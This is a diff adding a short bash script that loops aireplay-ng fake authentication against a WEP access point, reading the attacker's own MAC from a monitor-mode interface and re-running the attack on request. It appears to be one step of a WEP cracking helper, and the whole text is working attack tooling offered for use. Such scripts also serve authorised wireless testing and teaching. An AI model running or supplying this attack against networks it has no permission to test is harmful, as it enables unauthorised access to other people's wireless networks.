@@ -1,0 +1,30 @@
+#! /bin/bash
+echo -e "Press any key to start fake authentication..."
+read
+while true
+do
+	echo -e "--------------------Fake authentication----------------------"
+	if [ "$FIRST" = "1" ]
+	then
+		aireplay-ng -1 0 -a $WEPB -h $MYMAC wlan0mon
+	else
+		echo -e "Getting you MAC...."
+		sleep 1
+		MYMAC=$(ifconfig wlan0mon | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}')
+		echo -e "Your MAC is $MYMAC"
+		sleep 1
+		echo -e "Starting fake-authentication..."
+		sleep 1
+		FIRST="1"
+		aireplay-ng -1 0 -a $WEPB -h $MYMAC wlan0mon
+	fi
+	echo -e "Re-fakeauth again?(y/n)(Enter=yes): "
+	read REF
+	if [ "$REF" = "n" ]
+	then
+		exit
+	else
+		clear
+		continue
+	fi
+done
